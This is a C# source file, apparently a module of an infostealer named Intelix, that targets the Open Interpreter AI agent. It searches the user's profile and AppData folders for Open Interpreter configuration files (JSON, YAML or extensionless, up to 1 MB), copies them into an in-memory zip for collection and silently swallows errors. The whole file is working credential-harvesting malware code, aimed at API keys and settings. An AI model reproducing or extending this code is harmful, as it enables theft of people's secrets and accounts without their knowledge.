using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class OpenInterpreter : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var entry = new Counter.CounterApplications { Name = "Open Interpreter" };
            string[] paths = {
                Path.Combine(userProfile, ".openinterpreter"),
                Path.Combine(appdata, "Open Interpreter"),
                Path.Combine(userProfile, ".config", "open-interpreter")
            };
            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;
                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.TopDirectoryOnly))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext != ".json" && ext != ".yaml" && ext != ".yml" && ext != "") continue;
                    if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                    try
                    {
                        string rel = "AI-Agent\\OpenInterpreter\\" + Path.GetFileName(file);
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
